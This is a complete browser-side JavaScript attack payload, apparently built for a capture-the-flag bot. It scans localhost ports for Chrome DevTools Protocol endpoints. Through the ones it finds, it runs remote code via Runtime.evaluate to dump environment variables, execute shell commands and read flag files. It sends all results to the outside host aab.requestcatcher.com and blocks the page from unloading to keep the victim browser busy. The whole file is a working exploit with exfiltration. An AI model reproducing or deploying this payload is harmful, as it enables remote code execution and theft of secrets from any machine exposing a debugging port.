(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    const MAX_PORT = 60000; // Scan up to port 60000
    const CHUNK_SIZE = 1000; // Scan ports in chunks
    const HEARTBEAT_INTERVAL = 5 * 60 * 1000; // 5 minutes
    
    // =================================================================
    // UTILITY FUNCTIONS
    // =================================================================
    
    let isScanning = false;
    
    function send(endpoint, data) {
        try {
            fetch(SERVER + '/' + endpoint, {
                method: 'POST',
                mode: 'no-cors',
                body: data
            });
        } catch(e) {}
    }
    
    function log(msg, type = 'info') {
        console.log(`[${type.toUpperCase()}]`, msg);
        if (type === 'critical') {
            send('log-critical', msg);
        } else if (type === 'success') {
            send('log-success', msg);
        }
    }
    
    // =================================================================
    // AGGRESSIVE PARALLEL CDP SCANNER
    // =================================================================
    
    async function scanPortsParallel(startPort = 1, endPort = MAX_PORT, batchSize = 50) {
        if (isScanning) {
            log('Scan already in progress', 'warning');
            return;
        }
        
        isScanning = true;
        log(`🚀 Starting AGGRESSIVE CDP scan: ports ${startPort}-${endPort}`, 'critical');
        
        const foundPorts = [];
        const promises = [];
        
        // Create promises for each batch of ports
        for (let port = startPort; port <= endPort; port += batchSize) {
            const batchStart = port;
            const batchEnd = Math.min(port + batchSize - 1, endPort);
            
            promises.push(scanBatch(batchStart, batchEnd, foundPorts));
        }
        
        // Wait for all batches to complete
        await Promise.allSettled(promises);
        
        isScanning = false;
        log(`✅ Scan complete! Found ${foundPorts.length} CDP ports: ${foundPorts.join(', ')}`, 'success');
        
        // Send summary
        send('scan-summary', JSON.stringify({
            totalScanned: endPort - startPort + 1,
            foundPorts: foundPorts,
            timestamp: new Date().toISOString()
        }, null, 2));
        
        return foundPorts;
    }
    
    async function scanBatch(startPort, endPort, foundPorts) {
        const batchPromises = [];
        
        for (let port = startPort; port <= endPort; port++) {
            batchPromises.push(
                fetch(`http://127.0.0.1:${port}/json`, {
                    method: 'GET',
                    mode: 'no-cors',
                    headers: { 'Accept': 'application/json' }
                })
                .then(async response => {
                    if (response.ok) {
                        try {
                            const data = await response.json();
                            if (Array.isArray(data)) {
                                foundPorts.push(port);
                                handleCDPDiscovery(port, data);
                            }
                        } catch(e) {}
                    }
                })
                .catch(() => {})
            );
        }
        
        await Promise.allSettled(batchPromises);
        log(`📊 Batch ${startPort}-${endPort} complete`, 'info');
    }
    
    function handleCDPDiscovery(port, data) {
        const output = `
========================================
⚡ CDP FOUND - FAST SCAN
========================================
PORT: ${port}
TABS: ${data.length}
TIME: ${new Date().toISOString()}
========================================
WEBSOCKET: ${data[0]?.webSocketDebuggerUrl || 'N/A'}
========================================
`;
        
        send(`cdp-fast-${port}`, output);
        log(`🎯 CDP at port ${port} (${data.length} tabs)`, 'success');
        
        // IMMEDIATELY exploit
        if (data[0]?.webSocketDebuggerUrl) {
            exploitCDPImmediately(port, data[0].webSocketDebuggerUrl);
        }
    }
    
    // =================================================================
    // FAST CDP EXPLOITATION
    // =================================================================
    
    function exploitCDPImmediately(port, wsUrl) {
        log(`⚡ Exploiting port ${port} immediately...`, 'critical');
        
        const ws = new WebSocket(wsUrl);
        const startTime = Date.now();
        
        ws.onopen = () => {
            log(`✅ Connected to CDP port ${port} in ${Date.now() - startTime}ms`, 'success');
            
            // Send ALL commands at once with minimal delay
            const commands = [
                `JSON.stringify({cwd:process.cwd(),env:process.env})`,
                `require('child_process').execSync('ls -la / 2>/dev/null || dir /').toString().slice(0,2000)`,
                `require('fs').readFileSync('/flag.txt','utf8').catch(()=>'NOT_FOUND')`,
                `require('fs').readFileSync('/app/flag.txt','utf8').catch(()=>'NOT_FOUND')`,
                `require('fs').readFileSync('/home/flag.txt','utf8').catch(()=>'NOT_FOUND')`
            ];
            
            commands.forEach((cmd, i) => {
                setTimeout(() => {
                    ws.send(JSON.stringify({
                        id: i + 1,
                        method: 'Runtime.evaluate',
                        params: { expression: cmd, awaitPromise: true, returnByValue: true }
                    }));
                }, i * 100); // Minimal delay
            });
            
            // Close after 3 seconds
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                    log(`✅ Finished exploiting port ${port}`, 'success');
                }
            }, 3000);
        };
        
        ws.onmessage = (event) => {
            try {
                const response = JSON.parse(event.data);
                if (response.result?.result?.value) {
                    const value = response.result.result.value;
                    
                    send(`rce-${port}-${response.id}`, `
PORT: ${port}
CMD: ${response.id}
RESULT: ${value.substring(0, 1000)}${value.length > 1000 ? '...' : ''}
`);
                    
                    log(`📦 Got result from port ${port}, cmd ${response.id}`, 'success');
                }
            } catch(e) {}
        };
        
        ws.onerror = () => {
            log(`❌ Failed to exploit port ${port}`, 'warning');
        };
    }
    
    // =================================================================
    // MINIMALISTIC BOT HOLDING
    // =================================================================
    
    function minimalHold() {
        // Just prevent page from unloading
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
        
        // Keep a simple interval running
        setInterval(() => {
            // Do nothing, just keep script alive
        }, 10000);
        
        log('🔒 Minimal bot hold activated', 'info');
    }
    
    // =================================================================
    // INITIALIZATION & EXECUTION
    // =================================================================
    
    async function main() {
        log('🚀 Starting FAST CDP exploitation', 'critical');
        
        // Send initial beacon
        send('init', JSON.stringify({
            time: new Date().toISOString(),
            ua: navigator.userAgent,
            url: window.location.href
        }, null, 2));
        
        // Start minimal hold
        minimalHold();
        
        // Start scanning immediately
        await scanPortsParallel(1, 1000); // First scan common ports
        
        // Continue scanning in background
        setTimeout(async () => {
            await scanPortsParallel(1001, 10000);
        }, 5000);
        
        setTimeout(async () => {
            await scanPortsParallel(10001, 30000);
        }, 15000);
        
        setTimeout(async () => {
            await scanPortsParallel(30001, MAX_PORT);
        }, 30000);
        
        log('✅ All scan jobs scheduled', 'success');
    }
    
    // =================================================================
    // HEARTBEAT (ONLY EVERY 5 MINUTES)
    // =================================================================
    
    let heartbeatCount = 0;
    setInterval(() => {
        heartbeatCount++;
        const msg = `💓 Heartbeat ${heartbeatCount} at ${new Date().toISOString()}`;
        send('heartbeat', msg);
        log(msg, 'info');
    }, HEARTBEAT_INTERVAL);
    
    // =================================================================
    // CLEANUP AFTER 30 MINUTES
    // =================================================================
    
    setTimeout(() => {
        log('⏰ 30 minutes completed - sending final report', 'critical');
        
        send('final-report', `
========================================
🏁 MISSION COMPLETE
========================================
Duration: 30 minutes
End Time: ${new Date().toISOString()}
Total Heartbeats: ${heartbeatCount}
Status: COMPLETED
========================================
`);
        
        log('✅ All tasks completed successfully', 'success');
    }, 30 * 60 * 1000);
    
    // =================================================================
    // START EVERYTHING
    // =================================================================
    
    // Start immediately
    setTimeout(main, 100);
    
})();
